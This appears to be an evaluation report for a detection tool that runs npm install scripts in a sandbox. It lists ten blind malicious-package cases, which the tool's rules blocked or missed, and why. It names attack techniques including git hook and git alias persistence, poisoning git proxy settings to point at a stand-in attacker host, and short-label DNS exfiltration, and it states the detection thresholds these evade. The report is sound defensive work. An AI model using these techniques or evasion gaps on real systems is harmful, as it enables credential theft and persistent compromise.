# Held-out blind corpus: what the deterministic rules caught and missed

**Detonated 2026-11-03** on the live Chamber against `fugeretrevin/Detonator@f013bd0` (the
`blind-payloads` side branch), all 10 cases, `rc=0`. Telemetry is committed under
`eval/blind_telemetry/`; re-score offline with `python -m eval.score_blind`.

This is the first measurement against a set written **blind to the detectors** (see
`eval/blind_corpus.py`). Its value is the misses: four of ten slip past the deterministic rules,
and all four are technique classes the rule set was not built for — which is exactly what a
held-out set is supposed to surface and an author-written set cannot.

## Result (rules floor, no model)

| Case | Technique | Rules verdict | Why |
|---|---|---|---|
| bc01-staged-hooks | staged egress across pre/postinstall | 🛑 Blocked (`NET_RAW_IP`) | the generated stage still connected to a raw IP |
| bc02-dead-drop | harvest env+`~/.npmrc` to disk | 🛑 Blocked (`CRED_FILE_ACCESS`) | read the bait credential from an install script |
| bc03-git-hook | write `.git/hooks/post-checkout` | ✅ **MISS** | the hook write is not traced; it fires on a later checkout |
| bc04-git-alias | `git config` alias with embedded curl | ✅ **MISS** | `git config` is not inspected; curl never execs at install |
| bc05-delayed-beacon | detached child connects 6 s post-install | 🛑 Blocked (`NET_RAW_IP`) | the detonation window held long enough to capture it |
| bc06-platform-gate | egress only on Linux CI | 🛑 Blocked (`NET_RAW_IP`) | ran on Linux and connected |
| bc07-npm-token | harvest `_authToken`, stage to /tmp | 🛑 Blocked (`CRED_FILE_ACCESS`) | read the bait credential |
| bc08-dns-exfil | host id hex-encoded in a DNS label | ✅ **MISS** | 24-char label is under the `MIN_ENCODED_LABEL = 40` floor |
| bc09-path-shadow | git shim + `~/.bashrc` PATH prepend | 🛑 Blocked (`FILE_PERSISTENCE`) | the `~/.bashrc` write tripped the persistence rule |
| bc10-git-proxy | poison global `git http.proxy` | ✅ **MISS** | `git config` is not inspected; no connection at install |

**6 of 10 blocked at the rules floor; 4 missed.** The exact 95% interval on 6/10 is wide
(26–88%) — this is a diagnostic set, not a recall estimate, and should never be quoted as one.

Two positives worth noting, both on cases the rules were *not* tuned for:
- **bc05** — a child that connects 6 s after `npm install` returns was still caught, so the
  detonation window did not close early on it.
- **bc09** — `FILE_PERSISTENCE`, added Nov 3, caught a held-out PATH-hijack case it was not
  written against. The rule generalised beyond its two motivating cases.

## The gaps, grouped by root cause

**1. `git config` and `.git/hooks` are an untraced attack surface (bc03, bc04, bc10).**
Three of the four misses are the same hole. An install script can:
- write an executable `.git/hooks/post-checkout` that beacons on the next checkout (bc03),
- register a `git config --global alias.X '!curl …'` that runs a command on later git use (bc04),
- set `git config --global http.proxy http://<attacker>` to MITM future git traffic (bc10).

All three are **dormant at install time** — the payload fires on *later* git activity — so there
is no connection or dropped binary for a behavioural rule to catch, and nothing inspects the
`git config` exec args or traces writes under `.git/hooks/` or `~/.gitconfig`. The exec of
`git config …` *is* recorded (bc04 and bc10 show it in the telemetry, raw IP and all), so the
evidence is present; no rule reads it.

**2. The DNS encoded-label rule has a length floor a short label evades (bc08).**
`DNS_ENCODED_LABEL` fires on an encoded-looking label of `MIN_ENCODED_LABEL = 40`+ characters.
The blind case hex-encodes a hostname into a **24-character** label — real exfiltration of a
short identifier — which is under the floor, so the rule stays silent. The DNS query *is*
captured (`613334386439643930336132.collector.invalid`); only the threshold misses it.

## What this does and does not say

- **Rules floor, not the tool.** This is the deterministic layer alone. The full pipeline adds
  the model analysis, which reads the install-script source — and for bc04 and bc10 the
  `git config` command (raw IP included) is right there in the diff, so the model arm may well
  flag them. Measuring that needs a model run (~API cost); it has not been done, so the honest
  headline is **"4 of 10 get past the deterministic floor"**, not "past the tool".
- **Not a recall rate.** Ten author-independent cases are a gap-finder, not a population sample.
- **Fixes are gated, not rushed.** None of these is fixed here. Per the project's standing rule,
  a detection change gets a frozen corpus, a measured benign false-positive rate, and a rollback
  before it ships. These gaps are recorded as W14 and W15 in `docs/WEAKPOINTS.md` with that
  gate. In particular, lowering `MIN_ENCODED_LABEL` trades directly against false positives on
  legitimate long labels (CDN cache keys, content hashes) and must be measured against the
  742-install corpus first.
